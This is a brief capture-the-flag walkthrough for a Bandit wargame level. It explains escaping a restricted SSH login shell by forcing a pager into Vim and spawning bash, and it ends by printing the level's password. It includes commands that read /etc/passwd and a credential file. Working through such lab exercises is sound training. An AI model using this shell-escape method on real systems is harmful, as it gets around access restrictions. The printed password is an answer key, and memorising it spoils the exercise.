# Bandit Level 25 → 26

## Objective
Retrieve the password for `bandit26` by exploiting a restricted SSH session.

## Solution
1. Check user ID: `id`
2. List files: `ls -l` (find `bandit26.sshkey`)
3. Check passwd: `cat /etc/passwd | grep bandit26`
4. View script: `cat /usr/bin/showtext`
5. Connect with SSH: `ssh -oHostKeyAlgorithms=+ssh-dss -i bandit26.sshkey bandit26@localhost -p 2220`
6. Shrink terminal, enter Vim: press `v`
7. Set shell: `:set shell=/bin/bash` or `:shell`
8. Read password: `cat /etc/bandit_pass/bandit26`

## Password for bandit26
s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ